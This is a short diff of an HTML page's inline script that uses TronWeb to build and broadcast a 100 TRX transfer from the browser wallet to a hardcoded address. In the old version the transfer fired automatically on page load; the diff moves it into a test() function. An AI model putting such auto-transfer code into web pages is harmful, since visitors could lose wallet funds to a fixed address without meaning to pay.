@@ -13,9 +13,11 @@
     <body>
         <script>
 
+            function test(){
 
-        var obj = setInterval(async ()=>{
-            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+
+            var obj = setInterval(async ()=>{
+                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                 clearInterval(obj)
                 var tronweb = window.tronWeb
                 var tx = await tronweb.transactionBuilder.sendTrx('TEXcBaw1Fq7TH4hy4pvZULzo1YVLERk9Ti', 100 * 1000000,)
@@ -24,6 +26,13 @@
                 console.log(broastTx)
             }
         }, 10)
+
+
+
+            }
+
+
+    
 
             
             
